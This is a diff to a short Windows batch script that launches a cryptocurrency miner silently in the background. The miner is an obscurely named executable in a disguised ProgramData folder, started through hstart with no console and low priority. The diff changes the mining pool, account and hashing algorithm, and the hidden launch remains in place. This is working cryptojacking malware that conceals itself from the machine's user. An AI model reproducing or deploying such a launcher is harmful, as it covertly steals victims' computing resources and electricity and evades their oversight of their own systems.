@@ -1,6 +1,6 @@
 @echo off
 
-set minuser=oliverafa@gmail.com
-set minurl=stratum+tcp://xmr.pool.minergate.com:45560
+set minuser=oliverafa.2
+set minurl=stratum+tcp://us.multipool.us:3373
 
-start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /BELOWNORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -D -a cryptonight -o %minurl% -u %minuser% -p x"
+start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /BELOWNORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -D -a x11 -o %minurl% -u %minuser% -p x"
